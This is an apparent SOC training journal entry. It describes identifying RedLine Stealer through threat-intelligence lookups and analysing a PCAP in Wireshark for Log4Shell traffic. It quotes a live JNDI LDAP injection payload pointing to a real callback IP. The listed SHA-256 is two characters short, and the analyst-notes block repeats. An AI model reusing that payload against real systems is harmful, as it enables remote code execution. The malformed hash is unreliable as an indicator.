# Day 32 - Threat Intelligence and Wireshark Malware Traffic Analysis

## Overview
Day 32 combined threat intelligence with practical network traffic analysis.
The work focused on malware identification, IOC enrichment, PCAP analysis, and Log4Shell traffic.
The objective was to build an evidence-driven SOC investigation workflow.

## Objectives
- Investigate a suspicious SHA-256 hash.
- Identify the associated malware family.
- Enrich findings using public intelligence.
- Review malware behavior and YARA matches.
- Identify network infrastructure.
- Analyze a PCAP in Wireshark.
- Build and understand display filters.
- Search TCP payloads for indicators.
- Identify Log4Shell exploitation traffic.
- Distinguish packet counts from unique IP counts.

## Tools
- VirusTotal
- MalwareBazaar
- ThreatFox
- Wireshark
- CyberDefenders
- LetsDefend

## Malware Investigation
The investigated SHA-256 was:
`248FCC901AFFE4B4C8C91E4D78A939BF681C9A1BC24ADDC3551B32768F907B`

MalwareBazaar associated the sample with RedLine Stealer.
The sample was categorized as a Trojan in the lab workflow.
YARA signatures also supported RedLine-related identification.
ThreatFox was used to investigate associated infrastructure.

## VirusTotal Lesson
The initial VirusTotal lookup showed zero detections for the text object that was uploaded.
The object was a small text file containing the hash rather than the executable itself.
Therefore, the result could not be treated as proof that the referenced executable was benign.
Additional intelligence sources were used to validate the malware identification.

## MalwareBazaar Findings
The MalwareBazaar record identified RedLine Stealer.
The page included file hashes, metadata, behavioral intelligence, and YARA matches.
A rule named `detect_Redline_Stealer` matched the sample.
Additional rules identified related payload and PE characteristics.

## ThreatFox Findings
ThreatFox was used to investigate RedLine-related C2 infrastructure.
The relevant intelligence associated an IP and port with RedLine Stealer activity.
The record described botnet C2 behavior.
This provided network context for the malware investigation.

## PCAP Investigation
The network investigation used `Challenge.pcap`.
Wireshark was used to inspect TCP and HTTP traffic.
The capture contained suspicious JNDI LDAP requests.
The key payload was:
`${jndi:ldap://31.131.16.127:1389/Exploit}`

## Log4Shell Finding
The payload is consistent with Log4Shell exploitation activity.
The callback IP was `31.131.16.127`.
The LDAP callback port was `1389`.
The callback address appeared inside the HTTP request payload.
It was therefore not necessarily the packet's IP-layer destination.

## Wireshark Skills
Filters practiced included:
`ip.addr == X`
`tcp.port == 80`
`tcp.dstport == 80`
`tcp contains "string"`
`ip.addr == X && ip.addr == Y`

The Source and Destination columns were used to validate traffic direction.
The packet details pane was used to inspect protocol fields.
The packet bytes pane provided additional payload confirmation.

## Unique Source IP Analysis
The relevant filtered traffic showed two unique source addresses:
`46.105.95.220`
`104.248.144.120`

The number of unique source IP addresses was therefore 2.
Multiple packets did not represent multiple unique attackers.
Packet count and unique-IP count were treated as different measurements.

## Key Lessons
An IOC may exist in packet headers or inside application data.
The correct filter depends on where the evidence exists.
`ip.addr` searches the IP layer.
`tcp contains` searches TCP payload content.
A displayed packet count is not automatically a unique-host count.
Important findings should be validated manually.

## SOC Relevance
The hash can support endpoint hunting.
The malware family can support behavioral hunting.
The callback IP can support network searches.
The LDAP port can support suspicious-egress monitoring.
The JNDI string can support content-based detection.
The source IPs can be correlated with proxy and firewall logs.

## Evidence
Screenshots are stored in the Screenshots directory.
The evidence includes malware intelligence pages.
The evidence also includes Wireshark filtering and payload inspection.
The Wireshark Expert badge records completion of the practical exercise.

## Conclusion
Day 32 strengthened practical threat-intelligence and network-analysis skills.
The investigation identified RedLine Stealer and Log4Shell-related traffic.
The workflow emphasized evidence, validation, and correct filter selection.
Future work should combine network findings with endpoint and SIEM telemetry.
## Analyst Notes
Record important timestamps with findings.
Preserve indicators exactly as observed.
Keep evidence separate from interpretation.
Record why each filter was selected.
Validate important findings with more than one view.
Use screenshots to preserve visual evidence.
Correlate network findings with endpoint telemetry.
Do not assume that an IOC's context is obvious.
Record unexpected filter results as investigation lessons.
Keep unique values separate from raw packet counts.
Use threat intelligence as enrichment rather than unquestioned truth.
Confirm high-impact findings before disruptive response.
Document both the final answer and the reasoning.
These notes are intended for future SOC investigations.
Repeatable investigation methods are more valuable than platform-specific tricks.
## Analyst Notes
Record important timestamps with findings.
Preserve indicators exactly as observed.
Keep evidence separate from interpretation.
Record why each filter was selected.
Validate important findings with more than one view.
Use screenshots to preserve visual evidence.
Correlate network findings with endpoint telemetry.
Do not assume that an IOC's context is obvious.
Record unexpected filter results as investigation lessons.
Keep unique values separate from raw packet counts.
Use threat intelligence as enrichment rather than unquestioned truth.
Confirm high-impact findings before disruptive response.
Document both the final answer and the reasoning.
These notes are intended for future SOC investigations.
Repeatable investigation methods are more valuable than platform-specific tricks.
## Analyst Notes
Record important timestamps with findings.
